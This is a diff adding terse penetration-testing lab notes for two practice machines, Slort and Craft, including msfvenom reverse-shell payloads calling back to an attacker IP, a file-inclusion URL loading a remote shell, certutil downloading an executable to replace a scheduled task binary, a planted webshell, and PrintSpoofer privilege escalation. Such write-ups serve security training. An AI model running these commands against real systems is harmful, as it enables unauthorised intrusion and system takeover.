@@ -1496,3 +1496,61 @@ nt authority\system
 ren Utilman.exe Utilman.old
 ren cmd.exe Utilman.exe
 ```
+
+## Slort
+1. Port scan
+```
+PORT      STATE SERVICE      REASON
+21/tcp    open  ftp          syn-ack
+135/tcp   open  msrpc        syn-ack
+139/tcp   open  netbios-ssn  syn-ack
+445/tcp   open  microsoft-ds syn-ack
+3306/tcp  open  mysql        syn-ack
+4443/tcp  open  pharos       syn-ack
+5040/tcp  open  unknown      syn-ack
+7680/tcp  open  pando-pub    syn-ack
+8080/tcp  open  http-proxy   syn-ack
+49664/tcp open  unknown      syn-ack
+49665/tcp open  unknown      syn-ack
+49666/tcp open  unknown      syn-ack
+49667/tcp open  unknown      syn-ack
+49668/tcp open  unknown      syn-ack
+49669/tcp open  unknown      syn-ack
+```
+
+2. Found LFI. 
+```
+msfvenom -p php/reverse_php LHOST=192.168.45.155 LPORT=8000 -o shell.php
+
+http://192.168.241.53:4443/Site/index.php?page=http://192.168.45.155/shell.php
+```
+
+3. Replace TFTP.EXE with your reverse shell. As per info.txt it's cron file. 
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.155 LPORT=8000 -f exe -o reverse.exe
+
+certutil -urlcache -f http://192.168.45.155/reverse.exe TFTP.EXE
+
+
+C:\WINDOWS\system32>whoami
+whoami
+slort\administrator
+```
+
+## Craft
+1. Port scan 
+```
+Open 192.168.241.169:80
+```
+
+2. Found client side attack, uploading odt file. Use https://0xdf.gitlab.io/2020/02/01/htb-re.html?source=post_page-----c92de878e004-------------------------------- this article to get reverse shell (macros code from siren vidoe)
+
+3. Obtained foothold. Then, find out httpd.exe service running. so, added webshell.php file in C:\Xampp\htdocs\assets, from where command can be executed. Access in browser and execute command and use powershell command to get reverse shell. 
+
+4. Shell as apache. Rooted in 2 methods. 
+```
+1. Use sweet potato and rev.php from msfvenom
+
+2. .\PrintSpoofer64.exe -i -c “cmd /c powershell -c C:/Windows/Tasks/shell.ps1"
+(shell.ps1 have reverse shell command)
+```
